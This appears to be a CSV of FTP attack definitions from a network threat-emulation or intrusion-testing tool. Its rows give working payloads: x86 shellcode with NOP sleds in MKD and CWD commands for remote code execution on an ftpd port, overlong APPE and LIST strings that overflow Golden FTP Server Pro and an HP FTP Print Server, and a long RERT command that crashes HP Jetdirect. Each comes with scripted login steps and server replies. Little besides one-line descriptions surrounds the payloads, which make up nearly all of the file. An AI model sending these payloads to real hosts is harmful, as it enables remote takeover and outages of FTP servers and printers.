XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,MKD ||8F E1 ||)h||8F E5 05 FC 8F E5 07 84 8F E5 05 FC 01 80 04 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 0D 0A||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,CWD ||8F E1 ||)h||8F E5 05 FC 8F E5 07 84 8F E5 05 FC 01 80 04 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 03 CC FF FF BF 0D 0A||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,MKD ||90 90 90 90 90 90 90 90 EB ||p1||C0 ||1||DB ||1||C9 B0 ||F||CD 80 ||^||90 B8 BE FF FF FF FF FF FF F7 D0 89 06 B0 ||'||8D 1E FE C5 B1 ED CD 80 ||1||C0 8D 1E B0 ||=||CD 80 ||f||B9 FF FF 03 BB D2 D1 D0 FF FF F7 DB 89 1E 8D 1E B0 0C CD 80 E2 EF B8 D1 FF FF FF FF FF FF F7 D0 89 06 B0 ||=||8D 1E CD 80 ||1||C0 ||1||DB 89 F1 B0 02 89 06 B0 01 89 ||F||04 B0 06 89 ||F||08 B0 ||fC||CD 80 89 F1 89 06 B0 02 ||f||89 ||F||0C EB 04 EB ||t||EB ||w||B0 ||wf||89 ||F||0E 8D ||F||0C 89 ||F||04 ||1||C0 89 ||F||10 B0 10 89 ||F||08 B0 ||fC||CD 80 B0 01 89 ||F||04 B0 ||f||B3 04 CD 80 ||1||C0 89 ||F||04 89 ||F||08 B0 ||f||B3 05 CD 80 88 C3 B0 ||?1||C9 CD 80 B0 ||?||B1 01 CD 80 B0 ||?||B1 02 CD 80 B8 D0 9D 96 91 F7 D0 89 06 B8 D0 8C 97 D0 F7 D0 89 ||F||04 ||1||C0 88 ||F||07 89 ||v||08 89 ||F||0C B0 0B 89 F3 8D ||N||08 8D ||V||0C CD 80 E8 15 FF FF FF FF FF FF 0D 0A||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,CWD ||90 90 90 90 90 90 90 90 EB ||p1||C0 ||1||DB ||1||C9 B0 ||F||CD 80 ||^||90 B8 BE FF FF FF FF FF FF F7 D0 89 06 B0 ||'||8D 1E FE C5 B1 ED CD 80 ||1||C0 8D 1E B0 ||=||CD 80 ||f||B9 FF FF 03 BB D2 D1 D0 FF FF F7 DB 89 1E 8D 1E B0 0C CD 80 E2 EF B8 D1 FF FF FF FF FF FF F7 D0 89 06 B0 ||=||8D 1E CD 80 ||1||C0 ||1||DB 89 F1 B0 02 89 06 B0 01 89 ||F||04 B0 06 89 ||F||08 B0 ||fC||CD 80 89 F1 89 06 B0 02 ||f||89 ||F||0C EB 04 EB ||t||EB ||w||B0 ||wf||89 ||F||0E 8D ||F||0C 89 ||F||04 ||1||C0 89 ||F||10 B0 10 89 ||F||08 B0 ||fC||CD 80 B0 01 89 ||F||04 B0 ||f||B3 04 CD 80 ||1||C0 89 ||F||04 89 ||F||08 B0 ||f||B3 05 CD 80 88 C3 B0 ||?1||C9 CD 80 B0 ||?||B1 01 CD 80 B0 ||?||B1 02 CD 80 B8 D0 9D 96 91 F7 D0 89 06 B8 D0 8C 97 D0 F7 D0 89 ||F||04 ||1||C0 88 ||F||07 89 ||v||08 89 ||F||0C B0 0B 89 F3 8D ||N||08 8D ||V||0C CD 80 E8 15 FF FF FF FF FF FF 0D 0A||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,MKD ||90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0D 0A||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,CWD ||90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0D 0A||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,MKD ||90 90 90 90 90 90 90 90 EB ||p1||C0 ||1||DB ||1||C9 B0 ||F||CD 80 ||^||90 B8 BE FF FF FF FF FF FF F7 D0 89 06 B0 ||'||8D 1E FE C5 B1 ED CD 80 ||1||C0 8D 1E B0 ||=||CD 80 ||f||B9 FF FF 03 BB D2 D1 D0 FF FF F7 DB 89 1E 8D 1E B0 0C CD 80 E2 EF B8 D1 FF FF FF FF FF FF F7 D0 89 06 B0 ||=||8D 1E CD 80 ||1||C0 ||1||DB 89 F1 B0 02 89 06 B0 01 89 ||F||04 B0 06 89 ||F||08 B0 ||fC||CD 80 89 F1 89 06 B0 02 ||f||89 ||F||0C EB 04 EB ||t||EB ||w||B0 ||wf||89 ||F||0E 8D ||F||0C 89 ||F||04 ||1||C0 89 ||F||10 B0 10 89 ||F||08 B0 ||fC||CD 80 B0 01 89 ||F||04 B0 ||f||B3 04 CD 80 ||1||C0 89 ||F||04 89 ||F||08 B0 ||f||B3 05 CD 80 88 C3 B0 ||?1||C9 CD 80 B0 ||?||B1 01 CD 80 B0 ||?||B1 02 CD 80 B8 D0 9D 96 91 F7 D0 89 06 B8 D0 8C 97 D0 F7 D0 89 ||F||04 ||1||C0 88 ||F||07 89 ||v||08 89 ||F||0C B0 0B 89 F3 8D ||N||08 8D ||V||0C CD 80 E8 15 FF FF FF FF FF FF 0D 0A||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,CWD ||90 90 90 90 90 90 90 90 EB ||p1||C0 ||1||DB ||1||C9 B0 ||F||CD 80 ||^||90 B8 BE FF FF FF FF FF FF F7 D0 89 06 B0 ||'||8D 1E FE C5 B1 ED CD 80 ||1||C0 8D 1E B0 ||=||CD 80 ||f||B9 FF FF 03 BB D2 D1 D0 FF FF F7 DB 89 1E 8D 1E B0 0C CD 80 E2 EF B8 D1 FF FF FF FF FF FF F7 D0 89 06 B0 ||=||8D 1E CD 80 ||1||C0 ||1||DB 89 F1 B0 02 89 06 B0 01 89 ||F||04 B0 06 89 ||F||08 B0 ||fC||CD 80 89 F1 89 06 B0 02 ||f||89 ||F||0C EB 04 EB ||t||EB ||w||B0 ||wf||89 ||F||0E 8D ||F||0C 89 ||F||04 ||1||C0 89 ||F||10 B0 10 89 ||F||08 B0 ||fC||CD 80 B0 01 89 ||F||04 B0 ||f||B3 04 CD 80 ||1||C0 89 ||F||04 89 ||F||08 B0 ||f||B3 05 CD 80 88 C3 B0 ||?1||C9 CD 80 B0 ||?||B1 01 CD 80 B0 ||?||B1 02 CD 80 B8 D0 9D 96 91 F7 D0 89 06 B8 D0 8C 97 D0 F7 D0 89 ||F||04 ||1||C0 88 ||F||07 89 ||v||08 89 ||F||0C B0 0B 89 F3 8D ||N||08 8D ||V||0C CD 80 E8 15 FF FF FF FF FF FF 0D 0A||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,MKD ||90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0D 0A||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,CWD ||90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0D 0A||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,XPWD||0D 0A||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,220 Spire||6e ||tFTPD Server (We||6c ||c||6f 6d ||e t||6f || b||6c ||aster) ||5b 3a 3a ||ffff||3a ||59||2e ||31||2e ||131||2e ||44||5d 0d 0a||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,331 Passw||6f ||rd required||0d 0a||
ftpd_ssl.xml,FTP SSL Threat,This threat causes a buffer overflow condition in the linux port of OpenBSD's ftp daemon.  This leads to remote code execution with the privileges of the ftp server.  Ftpd typically listens on port 21.,FTP,TCP,230 User ||6c 6f ||gged i||6e 2e 0d 0a||
﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿goldenftp_bof.xml,Golden FTP Server Pro 2.70 APPE command buffer overflow,This threat delivers a crafted FTP APPE command containing an excessively long string which triggers a buffer overflow condition. Golden FTP Server Pro is an FTP service which typically listens on port 21.,FTP,TCP,user username||0D 0A||
goldenftp_bof.xml,Golden FTP Server Pro 2.70 APPE command buffer overflow,This threat delivers a crafted FTP APPE command containing an excessively long string which triggers a buffer overflow condition. Golden FTP Server Pro is an FTP service which typically listens on port 21.,FTP,TCP,PASS password||0D 0A||
goldenftp_bof.xml,Golden FTP Server Pro 2.70 APPE command buffer overflow,This threat delivers a crafted FTP APPE command containing an excessively long string which triggers a buffer overflow condition. Golden FTP Server Pro is an FTP service which typically listens on port 21.,FTP,TCP,APPE ./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A||0D 0A||
goldenftp_bof.xml,Golden FTP Server Pro 2.70 APPE command buffer overflow,This threat delivers a crafted FTP APPE command containing an excessively long string which triggers a buffer overflow condition. Golden FTP Server Pro is an FTP service which typically listens on port 21.,FTP,TCP,220 Spire||6e ||tFTPD Server (We||6c ||c||6f 6d ||e t||6f || b||6c ||aster) ||5b 3a 3a ||ffff||3a ||59||2e ||31||2e ||131||2e ||44||5d 0d 0a||
goldenftp_bof.xml,Golden FTP Server Pro 2.70 APPE command buffer overflow,This threat delivers a crafted FTP APPE command containing an excessively long string which triggers a buffer overflow condition. Golden FTP Server Pro is an FTP service which typically listens on port 21.,FTP,TCP,331 Passw||6f ||rd required||0d 0a||
goldenftp_bof.xml,Golden FTP Server Pro 2.70 APPE command buffer overflow,This threat delivers a crafted FTP APPE command containing an excessively long string which triggers a buffer overflow condition. Golden FTP Server Pro is an FTP service which typically listens on port 21.,FTP,TCP,230 User ||6c 6f ||gged i||6e 2e 0d 0a||
﻿﻿hp_jetdir_ftpserver_dos.xml,HP Jetdirect FTP Print Server RERT Command Denial Of Service Vulnerability,This threat will crash an HP Jetdirect FTP Print Server with a very long RERT Command. HP Jetdirect FTP Print Server  typically listens on port 21.,FTP,TCP,user anonymous||0D 0A||
hp_jetdir_ftpserver_dos.xml,HP Jetdirect FTP Print Server RERT Command Denial Of Service Vulnerability,This threat will crash an HP Jetdirect FTP Print Server with a very long RERT Command. HP Jetdirect FTP Print Server  typically listens on port 21.,FTP,TCP,pass imperfect@imperfectnetworks.com||0D 0A||
hp_jetdir_ftpserver_dos.xml,HP Jetdirect FTP Print Server RERT Command Denial Of Service Vulnerability,This threat will crash an HP Jetdirect FTP Print Server with a very long RERT Command. HP Jetdirect FTP Print Server  typically listens on port 21.,FTP,TCP,RERT AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||0D 0A||
hp_jetdir_ftpserver_dos.xml,HP Jetdirect FTP Print Server RERT Command Denial Of Service Vulnerability,This threat will crash an HP Jetdirect FTP Print Server with a very long RERT Command. HP Jetdirect FTP Print Server  typically listens on port 21.,FTP,TCP,220 Spire||6e ||tFTPD Server (We||6c ||c||6f 6d ||e t||6f || b||6c ||aster) ||5b 3a 3a ||ffff||3a ||59||2e ||31||2e ||131||2e ||44||5d 0d 0a||
hp_jetdir_ftpserver_dos.xml,HP Jetdirect FTP Print Server RERT Command Denial Of Service Vulnerability,This threat will crash an HP Jetdirect FTP Print Server with a very long RERT Command. HP Jetdirect FTP Print Server  typically listens on port 21.,FTP,TCP,331 Passw||6f ||rd required||0d 0a||
hp_jetdir_ftpserver_dos.xml,HP Jetdirect FTP Print Server RERT Command Denial Of Service Vulnerability,This threat will crash an HP Jetdirect FTP Print Server with a very long RERT Command. HP Jetdirect FTP Print Server  typically listens on port 21.,FTP,TCP,230 User ||6c 6f ||gged i||6e 2e 0d 0a||
﻿hp_printservftp_dos.xml,Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow Vulnerability,This threat crashes vulnerable HP Printer FTP Print Server via an excessively large LIST command. HP Printer FTP Print Server is an ftp server that typically listens on port 21.,FTP,TCP,USER anonymous||0D 0A||
hp_printservftp_dos.xml,Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow Vulnerability,This threat crashes vulnerable HP Printer FTP Print Server via an excessively large LIST command. HP Printer FTP Print Server is an ftp server that typically listens on port 21.,FTP,TCP,PASS anonymous@||0D 0A||
hp_printservftp_dos.xml,Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow Vulnerability,This threat crashes vulnerable HP Printer FTP Print Server via an excessively large LIST command. HP Printer FTP Print Server is an ftp server that typically listens on port 21.,FTP,TCP,TYPE A||0D 0A||
hp_printservftp_dos.xml,Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow Vulnerability,This threat crashes vulnerable HP Printer FTP Print Server via an excessively large LIST command. HP Printer FTP Print Server is an ftp server that typically listens on port 21.,FTP,TCP,PASV||0D 0A||
hp_printservftp_dos.xml,Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow Vulnerability,This threat crashes vulnerable HP Printer FTP Print Server via an excessively large LIST command. HP Printer FTP Print Server is an ftp server that typically listens on port 21.,FTP,TCP,LIST ./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A./A||0D 0A||
